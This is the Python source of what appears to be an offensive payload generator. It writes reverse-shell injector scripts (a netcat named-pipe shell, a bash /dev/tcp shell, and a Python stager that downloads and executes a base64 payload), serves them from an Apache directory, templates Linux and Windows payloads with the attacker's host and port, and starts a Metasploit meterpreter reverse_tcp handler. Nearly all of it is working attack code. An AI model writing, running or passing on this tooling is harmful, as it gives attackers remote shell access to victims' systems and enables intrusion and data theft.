import os
import base64
import subprocess
import threading

from config import config


class creator(config):

    def __init__(self):
        self.handler=""
        self.configuration = config()

    def startHandler(self):
        threading.Thread(target=self.startHandler()).start()


    def setHandler(self,handler):
        self.handler=handler
        self.createPayload();
        self.createInjector();
        if(self.handler=="meterpy"):
            self.startMsfMultiHandler();

    def createInjector(self):
        cmd = "rm -rf "+self.configuration.getApachePath()+"/Injector"
        os.system(cmd)
        cmd = "mkdir "+self.configuration.getApachePath()+"/Injector"
        os.system(cmd)
        if(os.path.isfile("./Injector/injector.py")==True):
            os.system("rm -rf ./Injector/injector.py")
        if(os.path.isfile("./Injector/injector.sh")==True):
            os.system("rm -rf ./Injector/injector.sh")
        if(os.path.isfile("./Injector/injector.bash")==True):
            os.system("rm -rf ./Injector/injector.bash")

        if(self.handler=="sh"):
            f = open("./Injector/injector.sh","w");
            f.write("#!/bin/sh\n")
            f.write("if [ ! -f /tmp/foo.txt ]; then\n")
            f.write(' rm /tmp/backpipe\n')
            f.write("fi\n")
            f.write("mknod /tmp/backpipe p\n")
            socket = "nc %s %s 0</tmp/backpipe |/bin/sh 1>/tmp/backpipe | echo 'sh' >/tmp/backpipe\n" %(self.configuration.getHost(),self.configuration.getPort())
            f.write(socket)
            f.close()
            cmd = "cp "+self.configuration.getPath()+"/Injector/injector.sh "+self.configuration.getApachePath()+"/Injector/"
            os.system(cmd)

        elif(self.handler=="bash"):
            f = open("./Injector/injector.bash","w");
            payload = "/bin/bash -i > /dev/tcp/%s/%s 0<&1 2>&1" %(self.configuration.getHost(),str(self.configuration.getPort()))
            f.write("#!/bin/bash\n")
            f.write(payload)
            f.close()
            cmd = "cp "+self.configuration.getPath()+"/Injector/injector.bash "+self.configuration.getApachePath()+"/Injector/"
            os.system(cmd)

        else:
            f = open("./Injector/injector.py","w");
            f.write("#!/usr/bin/python\n")
            f.write("import socket, struct\n")
            if(self.handler!="meterpy"):
                f.write("import base64\n")
            if(self.handler!="meterpy"):
                f.write("s=socket.socket()\n")
            else:
                f.write("s=socket.socket(2,1)\n")
            sockConnect = "s.connect(('%s',%d))\n" %(self.configuration.getHost(),self.configuration.getPort())
            f.write(sockConnect)
            if(self.handler!="meterpy"):
                f.write('s.send("GiveMePayload")\n');
            f.write("l=struct.unpack('>I',s.recv(4))[0]\n")
            if(self.handler!="meterpy"):
                f.write("d=s.recv(l)\n")
            else:
                f.write("d=s.recv(4096)\n")
                f.write("while len(d)!=l:\n")
                f.write(" d+=s.recv(4096)\n")
            if(self.handler!="meterpy"):
                f.write("exec(base64.b64decode(d),{'s':s})\n")
            else:
                f.write("exec(d,{'s':s})\n")
            f.close()

            cmd = "cp "+self.configuration.getPath()+"/Injector/injector.py "+self.configuration.getApachePath()+"/Injector/"
            os.system(cmd)

    def startMsfMultiHandler(self):

        meterpy = open(self.configuration.getPath()+"/handler/meterpy/meter.rc","w");
        meterpy.write("use exploit/multi/handler\n")
        meterpy.write("set payload python/meterpreter/reverse_tcp\n")
        lhost = "set LHOST 0.0.0.0\n"
        meterpy.write(lhost)
        lport = "set LPORT %s\n" % (self.configuration.getPort())
        meterpy.write(lport)
        meterpy.write("set ExitOnSession false\n")
        meterpy.write("exploit -j -z")
        meterpy.close()

        print("Loading Metasploit Please Wait...")
        FNULL = open(os.devnull, 'w')
        meter = "msfconsole -r %s" %(self.configuration.getPath()+"/handler/meterpy/meter.rc")
        cmd = "gnome-terminal -x  %s" %(meter)
        subprocess.Popen(cmd, shell=True, stdout=FNULL, stderr=subprocess.STDOUT)


    def startHandler(self):

        FNULL = open(os.devnull, 'w')
        file = '"'+self.configuration.getPath() + '/pyHandler.py"'
        cmdFile = "python -c 'import os; os.system(%s)'" %(file)
        cmd = "gnome-terminal -x  %s" %(cmdFile)
        subprocess.Popen(cmd, shell=True, stdout=FNULL, stderr=subprocess.STDOUT)


    def createPayload(self):

        f = open("./Injector/payload.b64","w");

        if(self.handler=="linux"):
            model = open(self.configuration.getPath()+"/handler/linux/payload.model").read();
            model = model.replace(">>>IP<<<",self.configuration.getHost())
            model = model.replace(">>>PORT<<<",str(self.configuration.getPort()))


            f.write(base64.b64encode(model));


        if(self.handler=='windows'):
            model = open(self.configuration.getPath()+"/handler/windows/payload.model").read();
            model = model.replace(">>>IP<<<",self.configuration.getHost())
            model = model.replace(">>>PORT<<<",str(self.configuration.getPort()))

            f.write(base64.b64encode(model));

        f.close()












